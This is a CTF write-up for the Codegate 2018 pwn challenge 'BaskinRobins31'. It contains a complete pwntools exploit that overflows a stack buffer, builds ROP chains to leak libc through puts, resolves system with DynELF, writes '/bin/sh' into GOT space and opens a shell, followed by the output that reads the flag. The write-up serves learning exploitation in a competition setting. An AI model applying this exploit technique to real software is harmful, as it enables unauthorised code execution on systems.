---
layout: post
category: Pwn
title: Codegate CTF 2018 Preliminary BaskinRobins31
tags: 
    - kowu
---

We were only provided with a x64 binary (no pic). It included an obvious overflow, allowing us to rop our way to the flag :) I could not find the used libc version (ok, i havent searched that hard), so I used pwnlibs DynELF Module. I wrote this writeup mainly to demonstrate the power of the DynELF Module in case you only have memory leaks at hand.

About the exploit there is not that much to say. We have `puts` (for reading memory) and `read` (for writing memory). At the end of every ropchain I jump back to the `entrypoint`, effectively "restoring" the stack and allowing further exploitation. All gadgets were found with radares "/R/ ..." utility. 


The plan is as follows:
- leak a pointer into libc by reading address at GOT (needed by DynELF)
- find out the address of system with the help of DynELF
- write "/bin/sh" into unused GOT space
- execute system("/bin/sh")
- profit

Now lean back and let DynELF do the work :D
```python
from pwn import *

r = remote("ch41l3ng3s.codegate.kr", 3131)


def leakat(addr):
    ropchain = struct.pack("<QQ", 0x00400bc3, addr)  # [pop rdi; ret;][addr]
    ropchain += struct.pack("<Q", 0x004006c0)  # [puts]
    ropchain += struct.pack("<Q", 0x00400780)  # entrypoint

    r.sendline("A" * 0xb8 + ropchain)
    r.recvuntil("Don't break the rules...:( \n")
    leak = r.recvuntil("###")[:-4]
    return leak + "\x00"


def pwn():
    libcptr = leakat(0x00602028)  # points into got
    libcptr = libcptr + "\x00" * (8 - len(libcptr))
    libcptr = struct.unpack("<Q", libcptr)[0] - 0xf6000  # subtract offset for speedup
    d = DynELF(leakat, libcptr)
    systemaddr = d.lookup('system')

    # write "/bin/sh\x00" to 0x006020b8 (writeable and unused address)
    log.info("writing \"/bin/sh\" into got")
    ropchain = struct.pack("<QQQQ", 0x0040087a, 0, 0x006020b8, 8)  # [pop rdi; pop rsi; pop rdx; ret][stdin][rw@got][8]
    ropchain += struct.pack("<Q", 0x00400700)  # [read]
    ropchain += struct.pack("<Q", 0x00400780)  # entrypoint
    r.sendline("A" * 0xb8 + ropchain)
    r.send("/bin/sh\x00")
    r.recvuntil("Don't break the rules...:( \n")

    # triggering shell
    log.info("triggering system(\"/bin/sh\")")
    ropchain = struct.pack("<QQ", 0x00400bc3, 0x006020b8)  # [pop rdi; ret;]["/bin/sh"]
    ropchain += struct.pack("<Q", systemaddr)  # [system]
    r.sendline("A" * 0xb8 + ropchain)
    r.recvuntil("Don't break the rules...:( \n")
    r.interactive()


if __name__ == '__main__':
    pwn()
```
In the end, there is profit of course.
```
[+] Opening connection to ch41l3ng3s.codegate.kr on port 3131: Done
[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.
[+] Finding base address: 0x7fa507ba4000
[+] Resolving 'system': 0x7fa50818f000
[*] writing "/bin/sh" into got
[*] triggering system("/bin/sh")
[*] Switching to interactive mode
$ whoami
player
$ ls
BaskinRobins31
flag
$ cat flag
flag{The Korean name of "Puss in boots" is "My mom is an alien"}
```
